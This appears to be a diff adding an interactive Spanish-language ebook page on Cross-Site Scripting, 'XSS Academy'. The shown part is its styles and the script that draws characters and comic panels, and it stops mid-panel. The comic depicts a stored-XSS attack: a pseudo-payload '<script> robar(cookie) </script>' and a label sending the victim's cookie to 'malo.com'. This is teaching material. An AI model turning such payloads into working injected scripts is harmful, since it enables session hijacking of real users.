@@ -1,0 +1,1092 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>XSS Academy — El código oculto</title>
+<meta name="description" content="Ebook interactivo sobre Cross-Site Scripting: el caso ForoClase, simulador seguro, cómic y prevención.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --navy:#0B1B33; --navy2:#12284A; --navy3:#1C3A66; --line:#25426E;
+    --turq:#19D3C5; --turq2:#0FA89C; --white:#fff; --text:#DDE7F5; --muted:#8FA3C2;
+    --red:#FF5C6C; --amber:#FFB547; --green:#2BD48A;
+  }
+  *{ box-sizing:border-box; }
+  html{ scroll-behavior:smooth; }
+  body{ margin:0; background:var(--navy); color:var(--text); font-family:Inter, system-ui, sans-serif; line-height:1.6; overflow-x:hidden; }
+  body::before{ content:""; position:fixed; inset:0; z-index:-1; background-image:
+     linear-gradient(rgba(25,211,197,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(25,211,197,.05) 1px, transparent 1px);
+     background-size:36px 36px; }
+  h1,h2,h3{ font-family:"Space Grotesk", sans-serif; color:#fff; line-height:1.15; margin:0 0 12px; }
+  h2{ font-size:clamp(28px,5vw,44px); }
+  h3{ font-size:20px; display:flex; align-items:center; gap:8px; }
+  code,.mono{ font-family:"JetBrains Mono", monospace; }
+  a{ color:var(--turq); }
+  .wrap{ max-width:1040px; margin:0 auto; padding:0 16px; }
+  .kicker{ font-family:"JetBrains Mono"; font-size:12px; letter-spacing:.18em; text-transform:uppercase; color:var(--turq); font-weight:700; }
+  .lead{ font-size:18px; color:#C9D6EA; max-width:720px; }
+  .ic{ width:22px; height:22px; flex:none; color:var(--turq); }
+  .ic.lg{ width:34px; height:34px; }
+
+  nav{ position:sticky; top:0; z-index:50; background:rgba(11,27,51,.9); backdrop-filter:blur(10px); border-bottom:1px solid var(--line); }
+  nav .wrap{ display:flex; align-items:center; gap:14px; height:56px; overflow-x:auto; scrollbar-width:none; }
+  nav .brand{ font-family:"Space Grotesk"; font-weight:700; color:#fff; white-space:nowrap; text-decoration:none; }
+  nav .brand span{ color:var(--turq); }
+  nav .links{ display:flex; gap:4px; margin-left:auto; }
+  nav .links a{ color:var(--muted); text-decoration:none; font-size:13px; padding:6px 10px; border-radius:20px; white-space:nowrap; }
+  nav .links a.active, nav .links a:hover{ background:var(--navy3); color:#fff; }
+  .progress{ position:absolute; left:0; bottom:-1px; height:3px; background:var(--turq); width:0; }
+
+  section{ padding:90px 0; border-bottom:1px solid var(--line); scroll-margin-top:56px; }
+  .num{ font-family:"Space Grotesk"; font-weight:700; font-size:clamp(70px,14vw,120px); line-height:.9; color:transparent; -webkit-text-stroke:2px var(--turq); }
+
+  .card{ background:var(--navy2); border:1px solid var(--line); border-radius:14px; padding:20px; }
+  .grid2{ display:grid; grid-template-columns:repeat(auto-fit,minmax(280px,1fr)); gap:16px; }
+  .grid3{ display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:16px; }
+  .btn{ font:inherit; font-weight:700; border:none; cursor:pointer; padding:11px 18px; border-radius:10px; background:var(--turq); color:var(--navy); transition:transform .15s, filter .15s; text-decoration:none; display:inline-block; }
+  .btn:hover{ transform:translateY(-1px); filter:brightness(1.08); }
+  .btn.ghost{ background:transparent; color:var(--turq); border:1.5px solid var(--turq); }
+  .btn.amber{ background:var(--amber); color:var(--navy); }
+  textarea, input[type=text], select{ width:100%; font-family:"JetBrains Mono"; font-size:14px; background:#081324; color:#fff; border:1.5px solid var(--line); border-radius:10px; padding:12px; resize:vertical; }
+  select{ font-family:Inter; }
+  textarea:focus, input:focus, select:focus{ outline:none; border-color:var(--turq); }
+  pre.code{ font-family:"JetBrains Mono"; font-size:13.5px; background:#081324; border-radius:10px; padding:14px; margin:8px 0; white-space:pre-wrap; word-break:break-word; border:1.5px solid var(--line); }
+  .bad{ border-color:var(--red) !important; } .good{ border-color:var(--green) !important; }
+  .tagbad,.taggood{ display:inline-block; font-family:"JetBrains Mono"; font-size:11px; font-weight:700; padding:2px 10px; border-radius:20px; }
+  .tagbad{ background:var(--red); color:#fff; } .taggood{ background:var(--green); color:#04271A; }
+  .k{ color:#FF8FA3; }
+  .chips{ display:flex; flex-wrap:wrap; gap:8px; margin:10px 0; }
+  .chip{ font-family:"JetBrains Mono"; font-size:12px; background:var(--navy3); color:#fff; border:1px solid var(--line); border-radius:20px; padding:5px 12px; cursor:pointer; }
+  .chip:hover{ border-color:var(--turq); }
+  .note{ border-left:4px solid var(--turq); background:rgba(25,211,197,.08); padding:12px 16px; border-radius:0 10px 10px 0; margin:16px 0; }
+  .note.warn{ border-color:var(--red); background:rgba(255,92,108,.08); }
+  .reveal{ opacity:0; transform:translateY(24px); transition:opacity .7s, transform .7s; }
+  .reveal.in{ opacity:1; transform:none; }
+  .stamp{ display:inline-block; font-family:"Space Grotesk"; font-weight:700; letter-spacing:.12em; border:3px solid var(--red); color:var(--red); padding:4px 14px; border-radius:8px; transform:rotate(-8deg); }
+  .stamp.ok{ border-color:var(--green); color:var(--green); animation:pop .5s; }
+
+  /* personajes */
+  .who{ display:flex; gap:14px; align-items:center; }
+  .face{ width:76px; height:76px; flex:none; border-radius:50%; background:#E8F1F8; overflow:hidden; border:2px solid var(--line); }
+  .face.dark{ background:#081324; }
+  .face svg{ width:100%; height:100%; display:block; }
+  .who b{ font-family:"Space Grotesk"; color:#fff; font-size:18px; display:block; }
+  .who span{ color:var(--muted); font-size:14px; }
+
+  /* evidencias */
+  .pista{ margin-top:24px; border:2px dashed var(--amber); background:rgba(255,181,71,.07); border-radius:14px; padding:16px 18px; transition:background .4s; }
+  .pista .lbl{ font-family:"JetBrains Mono"; font-size:12px; font-weight:700; letter-spacing:.14em; color:var(--amber); display:flex; align-items:center; gap:8px; margin-bottom:6px; }
+  .pista .lbl .ic{ color:var(--amber); width:18px; height:18px; }
+  .pista .got{ margin-left:auto; font-size:11px; background:var(--amber); color:var(--navy); padding:2px 10px; border-radius:20px; opacity:0; transition:opacity .4s; }
+  .pista.found .got{ opacity:1; }
+  .pista p{ margin:0; }
+  .tracker{ display:grid; grid-template-columns:repeat(5,1fr); gap:10px; }
+  @media (max-width:640px){ .tracker{ grid-template-columns:1fr; } }
+  .slot{ border:2px dashed var(--line); border-radius:12px; padding:12px; min-height:110px; font-size:13.5px; color:var(--muted); }
+  .slot b{ font-family:"Space Grotesk"; font-size:22px; color:var(--line); display:block; }
+  .slot.found{ border-style:solid; border-color:var(--amber); color:#fff; background:rgba(255,181,71,.08); animation:pop .5s; }
+  .slot.found b{ color:var(--amber); }
+  .fab{ position:fixed; right:16px; bottom:16px; z-index:60; display:flex; align-items:center; gap:8px; background:var(--amber); color:var(--navy); font-weight:700; border:none; border-radius:30px; padding:10px 16px; cursor:pointer; box-shadow:0 10px 30px rgba(0,0,0,.4); font:inherit; font-weight:800; }
+  .fab .ic{ color:var(--navy); }
+  .fab.bump{ animation:pop .5s; }
+
+  /* HERO */
+  #inicio{ min-height:calc(100vh - 56px); display:flex; align-items:center; padding:60px 0; }
+  .hero{ display:grid; grid-template-columns:1.1fr 1fr; gap:30px; align-items:center; }
+  @media (max-width:820px){ .hero{ grid-template-columns:1fr; } }
+  .hero h1{ font-size:clamp(52px,10vw,96px); letter-spacing:-2px; }
+  .hero h1 span{ color:var(--turq); }
+  .typed{ font-family:"JetBrains Mono"; color:var(--turq); min-height:1.6em; }
+  .typed::after{ content:"▌"; animation:blink 1s steps(1) infinite; }
+  @keyframes blink{ 50%{ opacity:0 } }
+  .hero-art{ position:relative; }
+  .hero-art .villain{ position:absolute; width:150px; height:150px; right:-10px; top:-80px; filter:drop-shadow(0 12px 24px rgba(0,0,0,.5)); animation:float 4s ease-in-out infinite; }
+  @keyframes float{ 50%{ transform:translateY(-10px) } }
+  .browser{ background:var(--navy2); border:2px solid var(--line); border-radius:14px; overflow:hidden; box-shadow:0 30px 80px rgba(0,0,0,.4); }
+  .browser .bar{ background:var(--navy3); padding:10px 12px; display:flex; gap:6px; align-items:center; }
+  .browser .dot{ width:11px; height:11px; border-radius:50%; }
+  .browser .url{ margin-left:10px; flex:1; background:#081324; border-radius:6px; padding:3px 10px; font-family:"JetBrains Mono"; font-size:12px; color:var(--muted); overflow:hidden; white-space:nowrap; text-overflow:ellipsis; }
+  .browser .body{ padding:18px; font-family:"JetBrains Mono"; font-size:14px; min-height:220px; position:relative; }
+  .line{ opacity:0; animation:fadeline .5s forwards; }
+  @keyframes fadeline{ to{ opacity:1 } }
+
+  /* CAP 1 */
+  .parse-out{ font-family:"JetBrains Mono"; font-size:14px; background:#081324; border-radius:10px; padding:14px; min-height:56px; border:1.5px solid var(--line); word-break:break-word; }
+  .tok-text{ color:#fff; }
+  .tok-tag{ background:rgba(255,92,108,.18); color:var(--red); border-radius:4px; padding:0 3px; }
+  .tok-attr{ background:rgba(255,181,71,.2); color:var(--amber); border-radius:4px; padding:0 3px; }
+  .verdict{ margin-top:12px; font-weight:700; padding:10px 14px; border-radius:10px; }
+  .verdict.ok{ background:rgba(43,212,138,.12); color:var(--green); }
+  .verdict.ko{ background:rgba(255,92,108,.12); color:var(--red); }
+
+  /* CAP 2 */
+  .tabs{ display:flex; gap:8px; flex-wrap:wrap; margin-bottom:16px; }
+  .tab{ font:inherit; font-weight:700; cursor:pointer; padding:10px 16px; border-radius:10px; border:1.5px solid var(--line); background:var(--navy2); color:var(--muted); display:flex; gap:8px; align-items:center; }
+  .tab .ic{ width:18px; height:18px; }
+  .tab.on{ border-color:var(--turq); color:#fff; background:var(--navy3); }
+  .stage{ position:relative; height:250px; background:#081324; border-radius:14px; border:1.5px solid var(--line); overflow:hidden; }
+  .actor{ position:absolute; top:40px; width:110px; text-align:center; font-size:12px; color:var(--muted); }
+  .actor svg{ width:90px; height:90px; display:block; margin:0 auto 4px; }
+  .packet{ position:absolute; top:150px; left:60px; font-family:"JetBrains Mono"; font-size:12px; padding:4px 10px; border-radius:20px; color:#fff; white-space:nowrap; opacity:0; }
+  .stage-cap{ position:absolute; left:0; right:0; bottom:12px; text-align:center; font-size:14px; color:#fff; padding:0 12px; }
+  .stage .db{ position:absolute; top:12px; left:50%; transform:translateX(-50%); font-family:"JetBrains Mono"; font-size:11px; color:var(--amber); white-space:nowrap; }
+
+  /* cómic */
+  .comic{ display:grid; grid-template-columns:repeat(3,1fr); gap:14px; }
+  @media (max-width:900px){ .comic{ grid-template-columns:repeat(2,1fr); } }
+  @media (max-width:560px){ .comic{ grid-template-columns:1fr; } }
+  .comic svg{ width:100%; height:auto; display:block; border-radius:10px; }
+
+  /* CAP 3 simulador */
+  .sim{ display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+  @media (max-width:820px){ .sim{ grid-template-columns:1fr; } }
+  .toggle{ display:inline-flex; background:#081324; border-radius:30px; padding:4px; border:1.5px solid var(--line); }
+  .toggle button{ font:inherit; font-size:13px; font-weight:700; border:none; cursor:pointer; padding:7px 14px; border-radius:30px; background:transparent; color:var(--muted); }
+  .toggle button.on.v{ background:var(--red); color:#fff; } .toggle button.on.p{ background:var(--green); color:#04271A; }
+  .forum{ background:#F4F8FB; color:#13213A; border-radius:0 0 12px 12px; min-height:260px; padding:14px; position:relative; }
+  .forum .cm{ background:#fff; border:1px solid #DCE4EE; border-radius:8px; padding:8px 10px; margin-bottom:8px; font-size:14px; }
+  .forum .cm b{ color:#1C3A66; font-size:12px; display:block; }
+  .forum iframe{ border:none; width:100%; height:44px; display:block; }
+  .viewer{ display:flex; align-items:center; gap:10px; color:var(--muted); font-size:14px; margin-top:10px; }
+  .viewer .face{ width:44px; height:44px; }
+  .fake-alert{ position:absolute; inset:0; background:rgba(11,27,51,.55); display:flex; align-items:center; justify-content:center; animation:fadeline .2s; }
+  .fake-alert .box{ background:#fff; color:#13213A; border-radius:10px; padding:16px 18px; width:86%; max-width:330px; box-shadow:0 20px 50px rgba(0,0,0,.4); font-size:14px; }
+  .fake-alert .box small{ color:#5B6B86; display:block; margin-bottom:6px; font-size:12px; }
+  .log{ font-family:"JetBrains Mono"; font-size:12.5px; background:#081324; border-radius:10px; padding:12px; min-height:120px; border:1.5px solid var(--line); max-height:220px; overflow:auto; }
+  .vec-help{ color:var(--muted); font-size:14px; margin:0 0 10px; }
+  .urlbar{ font-family:"JetBrains Mono"; font-size:13px; color:var(--amber); background:#081324; border:1.5px solid var(--line); border-bottom:none; border-radius:10px 10px 0 0; padding:8px 12px; }
+  .urlbar + textarea{ border-radius:0 0 10px 10px; }
+  .browser.attacker{ border-color:rgba(255,92,108,.55); margin-top:16px; }
+  .atk-body{ background:#050B16; font-family:"JetBrains Mono"; font-size:13px; min-height:150px; padding:14px; }
+  .atk-body .row{ color:var(--amber); margin-bottom:4px; word-break:break-all; }
+  .atk-body .muted{ color:var(--muted); }
+  .hijack{ background:#F4F8FB; color:#13213A; border-radius:10px; padding:14px; font-family:Inter, sans-serif; font-size:14px; animation:fadeline .4s; }
+  .hijack b.big{ font-family:"Space Grotesk"; font-size:18px; display:block; margin-bottom:4px; }
+  .hijack ul{ margin:6px 0; padding-left:20px; }
+  .log div{ margin-bottom:4px; } .log .r{ color:var(--red); } .log .g{ color:var(--green); } .log .a{ color:var(--amber); } .log .m{ color:var(--muted); }
+
+  /* CAP 4 historia */
+  .story{ max-width:780px; }
+  .scene{ animation:fadeline .4s; display:flex; gap:16px; align-items:flex-start; }
+  .scene .face{ width:70px; height:70px; }
+  .scene .who-t{ font-family:"JetBrains Mono"; font-size:12px; color:var(--amber); }
+  .scene p{ font-size:17px; margin-top:4px; }
+  .choices{ display:grid; gap:10px; margin-top:14px; }
+  .choice{ text-align:left; font:inherit; cursor:pointer; padding:14px 16px; border-radius:12px; border:1.5px solid var(--line); background:var(--navy); color:#fff; }
+  .choice:hover{ border-color:var(--turq); }
+  .meter{ display:flex; gap:10px; align-items:center; font-size:13px; color:var(--muted); margin-bottom:16px; }
+  .meter .barbg{ flex:1; height:10px; background:#081324; border-radius:10px; overflow:hidden; border:1px solid var(--line); }
+  .meter .fill{ height:100%; width:50%; background:linear-gradient(90deg,var(--red),var(--amber),var(--green)); transition:width .5s; }
+
+  /* CAP 5 */
+  .cmp{ display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+  @media (max-width:820px){ .cmp{ grid-template-columns:1fr; } }
+  .render{ background:#F4F8FB; color:#13213A; border-radius:10px; padding:12px; min-height:60px; font-size:14px; word-break:break-word; }
+  .layers{ display:grid; gap:10px; }
+  .layer{ display:flex; gap:12px; align-items:flex-start; cursor:pointer; }
+  .layer .n{ flex:none; width:34px; height:34px; border-radius:50%; background:var(--turq); color:var(--navy); display:flex; align-items:center; justify-content:center; font-weight:700; font-family:"Space Grotesk"; }
+  .layer .d{ display:none; color:#C9D6EA; font-size:14px; margin-top:6px; }
+  .layer.open .d{ display:block; }
+
+  /* SALA */
+  .cipher{ display:flex; gap:8px; flex-wrap:wrap; margin:12px 0; }
+  .cipher code{ background:#081324; border:1.5px solid var(--amber); color:var(--amber); border-radius:8px; padding:8px 10px; font-weight:700; }
+  .ascii{ display:grid; grid-template-columns:repeat(13,1fr); border:1px solid var(--line); border-radius:10px; overflow:hidden; text-align:center; font-size:13px; margin-top:10px; }
+  @media (max-width:640px){ .ascii{ grid-template-columns:repeat(7,1fr); } }
+  .ascii div{ padding:4px 0; border-right:1px solid var(--line); border-bottom:1px solid var(--line); }
+  .ascii b{ display:block; color:#fff; } .ascii span{ font-family:"JetBrains Mono"; color:var(--muted); font-size:11px; }
+  .vault{ display:flex; gap:10px; flex-wrap:wrap; }
+  .vault input{ flex:1; min-width:200px; text-transform:uppercase; letter-spacing:.3em; font-size:20px; text-align:center; }
+  .shake{ animation:shake .4s; }
+  @keyframes shake{ 25%{ transform:translateX(-8px) } 75%{ transform:translateX(8px) } }
+  .locked{ display:none; }
+  .case-q{ margin-bottom:14px; }
+  .case-q label{ display:block; font-weight:700; margin-bottom:6px; color:#fff; }
+
+  /* opciones (Misión XSS) */
+  .opts{ display:grid; gap:8px; margin-top:8px; }
+  .opt{ text-align:left; font:inherit; cursor:pointer; padding:11px 14px; border-radius:10px; border:1.5px solid var(--line); background:var(--navy); color:#fff; }
+  .opt:hover:not([disabled]){ border-color:var(--turq); }
+  .opt.right{ border-color:var(--green); background:rgba(43,212,138,.15); }
+  .opt.wrong{ border-color:var(--red); background:rgba(255,92,108,.15); }
+  .opt[disabled]{ cursor:default; }
+  .fb{ font-size:14px; margin-top:6px; color:var(--muted); }
+  .badge{ text-align:center; padding:30px 20px; }
+  .medal{ width:110px; height:110px; margin:0 auto 10px; border-radius:50%; display:flex; align-items:center; justify-content:center; background:var(--navy3); border:3px solid var(--turq); animation:pop .6s; }
+  .medal .ic{ width:56px; height:56px; }
+  @keyframes pop{ 0%{ transform:scale(.3) } 70%{ transform:scale(1.12) } 100%{ transform:scale(1) } }
+
+  footer{ padding:50px 0 90px; text-align:center; color:var(--muted); font-size:14px; }
+  @media (prefers-reduced-motion: reduce){ *{ animation:none !important; transition:none !important; } .reveal{ opacity:1; transform:none; } }
+</style>
+</head>
+<body>
+<script>/* ilustraciones incluidas para que la página funcione como un solo archivo */
+/* XSS Academy — ilustraciones compartidas (versión impresa y web).
+   Inserta un sprite SVG con personajes e íconos, y expone XSSA.comic() con las 6 viñetas. */
+(function () {
+  const NAVY = "#0B1B33", TURQ = "#19D3C5", RED = "#FF5C6C", AMBER = "#FFB547";
+
+  const characters = `
+  <symbol id="ana" viewBox="0 0 120 120">
+    <circle cx="60" cy="15" r="11" fill="#3A2418"/>
+    <path d="M31 54 Q30 20 60 20 Q90 20 89 54 L89 72 Q87 80 80 82 L40 82 Q33 80 31 72Z" fill="#3A2418"/>
+    <path d="M22 120 Q23 88 60 86 Q97 88 98 120Z" fill="${TURQ}"/>
+    <path d="M44 88 Q60 100 76 88" fill="none" stroke="#0FA89C" stroke-width="4"/>
+    <path d="M54 92 L52 106 M66 92 L68 106" stroke="${NAVY}" stroke-width="2" stroke-linecap="round"/>
+    <rect x="52" y="74" width="16" height="14" fill="#E9B48A"/>
+    <ellipse cx="60" cy="55" rx="24" ry="27" fill="#F2C6A0"/>
+    <path d="M36 48 Q42 27 64 28 Q81 30 85 48 Q70 39 53 43 Q43 45 36 48Z" fill="#3A2418"/>
+    <circle cx="51" cy="57" r="3" fill="${NAVY}"/><circle cx="69" cy="57" r="3" fill="${NAVY}"/>
+    <circle cx="45" cy="65" r="4" fill="#F28B8B" opacity=".55"/><circle cx="75" cy="65" r="4" fill="#F28B8B" opacity=".55"/>
+    <path d="M53 68 Q60 74 67 68" stroke="${NAVY}" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+  </symbol>
+  <symbol id="dani" viewBox="0 0 120 120">
+    <path d="M22 120 Q22 88 60 86 Q98 88 98 120Z" fill="${AMBER}"/>
+    <path d="M49 87 L60 99 L71 87" fill="#fff"/>
+    <rect x="52" y="74" width="16" height="14" fill="#B97C55"/>
+    <ellipse cx="60" cy="55" rx="24" ry="27" fill="#D29A72"/>
+    <path d="M35 52 Q31 22 60 21 Q90 21 86 52 Q83 37 71 34 Q58 41 45 36 Q38 41 35 52Z" fill="#1A1A2E"/>
+    <circle cx="50" cy="57" r="8" fill="#fff" fill-opacity=".25" stroke="${NAVY}" stroke-width="2.5"/>
+    <circle cx="70" cy="57" r="8" fill="#fff" fill-opacity=".25" stroke="${NAVY}" stroke-width="2.5"/>
+    <path d="M58 57 L62 57" stroke="${NAVY}" stroke-width="2.5"/>
+    <circle cx="50" cy="57" r="2.5" fill="${NAVY}"/><circle cx="70" cy="57" r="2.5" fill="${NAVY}"/>
+    <path d="M54 70 Q60 74 66 70" stroke="${NAVY}" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+  </symbol>
+  <symbol id="nocturno" viewBox="0 0 120 120">
+    <path d="M16 120 Q19 84 60 80 Q101 84 104 120Z" fill="#1C2B45"/>
+    <path d="M60 82 L60 120" stroke="#2A4470" stroke-width="2"/>
+    <path d="M27 72 Q24 16 60 12 Q96 16 93 72 Q92 90 60 94 Q28 90 27 72Z" fill="#1C2B45"/>
+    <path d="M27 72 Q24 16 60 12 Q96 16 93 72" fill="none" stroke="#2A4470" stroke-width="3"/>
+    <ellipse cx="60" cy="60" rx="23" ry="27" fill="#050B16"/>
+    <path d="M44 56 L56 60 L44 63Z" fill="${RED}"/><path d="M76 56 L64 60 L76 63Z" fill="${RED}"/>
+    <text x="60" y="80" text-anchor="middle" font-family="JetBrains Mono, monospace" font-size="10" font-weight="700" fill="${TURQ}">&lt;/&gt;</text>
+  </symbol>
+  <symbol id="servidor" viewBox="0 0 120 120">
+    <rect x="26" y="10" width="68" height="102" rx="10" fill="#12284A" stroke="${TURQ}" stroke-width="3"/>
+    <rect x="35" y="21" width="50" height="11" rx="3" fill="#1C3A66"/><circle cx="78" cy="26.5" r="2.5" fill="#2BD48A"/>
+    <rect x="35" y="37" width="50" height="11" rx="3" fill="#1C3A66"/><circle cx="78" cy="42.5" r="2.5" fill="${AMBER}"/>
+    <rect x="35" y="56" width="50" height="46" rx="6" fill="#0B1B33"/>
+    <circle cx="50" cy="74" r="4" fill="${TURQ}"/><circle cx="70" cy="74" r="4" fill="${TURQ}"/>
+    <path d="M51 86 Q60 92 69 86" stroke="${TURQ}" stroke-width="3" fill="none" stroke-linecap="round"/>
+  </symbol>`;
+
+  const I = (id, body) => `<symbol id="${id}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">${body}</symbol>`;
+  const icons = [
+    I("i-cookie", '<path d="M12 3a9 9 0 1 0 9 9 3 3 0 0 1-3-3 3 3 0 0 1-3-3 3 3 0 0 1-3-3z"/><circle cx="8.5" cy="11" r="1"/><circle cx="14" cy="15.5" r="1"/><circle cx="9" cy="16" r="1"/>'),
+    I("i-lock", '<rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/>'),
+    I("i-clip", '<rect x="5" y="4" width="14" height="17" rx="2"/><path d="M9 4V3h6v1M8.5 10h7M8.5 14h7M8.5 18h4"/>'),
+    I("i-loop", '<path d="M4 12a8 8 0 0 1 14-5.3L20 8M20 4v4h-4M20 12a8 8 0 0 1-14 5.3L4 16M4 20v-4h4"/>'),
+    I("i-db", '<ellipse cx="12" cy="5.5" rx="7" ry="2.5"/><path d="M5 5.5v13c0 1.4 3.1 2.5 7 2.5s7-1.1 7-2.5v-13M5 12c0 1.4 3.1 2.5 7 2.5s7-1.1 7-2.5"/>'),
+    I("i-code", '<path d="M8 7l-5 5 5 5M16 7l5 5-5 5M13.5 4l-3 16"/>'),
+    I("i-hook", '<path d="M14 4v10a5 5 0 0 1-10 0v-2l3 3"/><circle cx="14" cy="3" r="1.2"/>'),
+    I("i-keyboard", '<rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M7 14h10"/>'),
+    I("i-brush", '<path d="M3 21c3 0 5-2 5-4a2 2 0 0 0-4 0c0 1-1 2-1 4z"/><path d="M9.5 15.5L20 5a1.4 1.4 0 0 0-2-2L7.5 13.5"/>'),
+    I("i-cursor", '<path d="M5 3l14 7-6 2-2 6z"/>'),
+    I("i-worm", '<path d="M3 15c2-4 4-4 6 0s4 4 6 0 4-4 6 0"/><circle cx="20.5" cy="13.6" r=".9"/>'),
+    I("i-folder", '<path d="M3 6a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>'),
+    I("i-search", '<circle cx="11" cy="11" r="6"/><path d="M20 20l-4.5-4.5"/>'),
+    I("i-key", '<circle cx="8" cy="15" r="4"/><path d="M11 12l9-9M17 6l3 3M15 8l2 2"/>'),
+    I("i-alert", '<path d="M12 3l10 18H2z"/><path d="M12 10v4M12 17.5h.01"/>'),
+    I("i-shield", '<path d="M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6z"/><path d="M9 12l2 2 4-4"/>'),
+  ].join("");
+
+  const sprite = `<svg xmlns="http://www.w3.org/2000/svg" style="position:absolute;width:0;height:0;overflow:hidden" aria-hidden="true">${characters}${icons}</svg>`;
+  document.body.insertAdjacentHTML("afterbegin", sprite);
+
+  /* ---------- cómic ---------- */
+  const esc = s => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  const use = (id, x, y, s) => `<use href="#${id}" x="${x}" y="${y}" width="${s}" height="${s}"/>`;
+  function bubble(x, y, w, lines, px, py) {
+    const h = lines.length * 17 + 14, bx = Math.max(x + 14, Math.min(x + w - 30, px - 8));
+    const tailY = py > y ? y + h : y;
+    return `<g font-family="Inter, sans-serif" font-size="13.5" font-weight="600">
+      <rect x="${x}" y="${y}" width="${w}" height="${h}" rx="12" fill="#fff" stroke="${NAVY}" stroke-width="2"/>
+      <path d="M${bx} ${tailY} L${px} ${py} L${bx + 16} ${tailY}" fill="#fff" stroke="${NAVY}" stroke-width="2" stroke-linejoin="round"/>
+      <line x1="${bx + 1.5}" y1="${tailY}" x2="${bx + 14.5}" y2="${tailY}" stroke="#fff" stroke-width="3"/>
+      ${lines.map((l, i) => `<text x="${x + w / 2}" y="${y + 23 + i * 17}" text-anchor="middle" fill="${NAVY}">${esc(l)}</text>`).join("")}
+    </g>`;
+  }
+  function laptop(x, y, w, rows) {
+    const h = Math.round(w * 0.62);
+    return `<g transform="translate(${x} ${y})">
+      <rect width="${w}" height="${h}" rx="6" fill="${NAVY}"/>
+      <rect x="6" y="6" width="${w - 12}" height="${h - 12}" rx="3" fill="#F4F8FB"/>
+      <path d="M-10 ${h} H${w + 10} L${w} ${h + 9} H0Z" fill="#1C3A66"/>
+      ${rows.map((r, i) => `<text x="13" y="${24 + i * 15}" font-family="JetBrains Mono, monospace" font-size="${r.size || 11}" font-weight="${r.bold ? 700 : 400}" fill="${r.color || NAVY}">${esc(r.t)}</text>`).join("")}
+    </g>`;
+  }
+  const frame = (n, title, inner) => `<svg class="vineta" viewBox="0 0 300 250" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Viñeta ${n}: ${esc(title)}">
+    <rect x="1" y="1" width="298" height="248" rx="10" fill="#E8F1F8" stroke="${NAVY}" stroke-width="2.5"/>
+    <path d="M1 11 a10 10 0 0 1 10 -10 H289 a10 10 0 0 1 10 10 V28 H1Z" fill="${NAVY}"/>
+    <text x="14" y="19" font-family="JetBrains Mono, monospace" font-size="11" font-weight="700" fill="${TURQ}">${n} · ${esc(title)}</text>
+    ${inner}</svg>`;
+
+  const panels = [
+    frame(1, "LUNES, 2:13 A. M.",
+      use("nocturno", 4, 108, 140) +
+      laptop(150, 138, 128, [{ t: "<b>hola</b>", size: 13 }, { t: "[Publicar]", color: "#0FA89C" }]) +
+      bubble(118, 44, 170, ["¿Este foro", "interpreta HTML?"], 92, 120)),
+    frame(2, "PRUEBA SUPERADA",
+      `<rect x="18" y="42" width="264" height="104" rx="8" fill="#fff" stroke="${NAVY}" stroke-width="2"/>
+       <rect x="18" y="42" width="264" height="20" rx="8" fill="#1C3A66"/><rect x="18" y="54" width="264" height="8" fill="#1C3A66"/>
+       <circle cx="30" cy="52" r="3.5" fill="${RED}"/><circle cx="41" cy="52" r="3.5" fill="${AMBER}"/><circle cx="52" cy="52" r="3.5" fill="#2BD48A"/>
+       <text x="32" y="86" font-family="Inter" font-size="11" fill="#5B6B86">n0cturno comentó:</text>
+       <text x="32" y="124" font-family="Inter" font-size="30" font-weight="800" fill="${NAVY}">hola</text>
+       <text x="112" y="122" font-family="Inter" font-size="12" font-weight="700" fill="${RED}">← ¡en negrita!</text>` +
+      use("nocturno", 196, 152, 100) +
+      bubble(12, 170, 176, ["¡La puerta", "está abierta!"], 210, 196)),
+    frame(3, "LA TRAMPA",
+      use("nocturno", 2, 108, 140) +
+      laptop(140, 128, 150, [{ t: "¡Gran tarea!", bold: true }, { t: "<script>", color: RED }, { t: " robar(cookie)", color: RED }, { t: "<\/script>", color: RED }]) +
+      bubble(14, 40, 214, ["Nadie verá el código,", "solo «¡Gran tarea!»"], 86, 118)),
+    frame(4, "GUARDADO SIN REVISAR",
+      use("servidor", 8, 82, 160) +
+      `<g transform="translate(166 150)"><rect width="122" height="74" rx="8" fill="#fff" stroke="${NAVY}" stroke-width="2"/>
+        <text x="10" y="20" font-family="JetBrains Mono" font-size="10" fill="#5B6B86">comentario #37</text>
+        <text x="10" y="40" font-family="JetBrains Mono" font-size="11" fill="${NAVY}">¡Gran tarea!</text>
+        <text x="10" y="58" font-family="JetBrains Mono" font-size="11" font-weight="700" fill="${RED}">&lt;script&gt;…</text></g>` +
+      bubble(132, 42, 156, ["Guardado ✓", "(sin revisar)"], 118, 112)),
+    frame(5, "7:42 A. M. — ANA ENTRA",
+      use("ana", 0, 104, 146) +
+      laptop(148, 140, 120, [{ t: "¡Gran tarea!", bold: true }, { t: "", }]) +
+      `<path d="M262 138 Q296 100 276 62" fill="none" stroke="${RED}" stroke-width="2.5" stroke-dasharray="6 5"/>
+       <path d="M276 62 L270 74 L283 72Z" fill="${RED}"/>
+       <rect x="180" y="40" width="112" height="20" rx="10" fill="${RED}"/>
+       <text x="236" y="54" text-anchor="middle" font-family="Inter, sans-serif" font-size="10.5" font-weight="700" fill="#fff">cookie → malo.com</text>` +
+      bubble(14, 42, 160, ["¡Qué buen", "comentario!"], 84, 116)),
+    frame(6, "SESIÓN ROBADA",
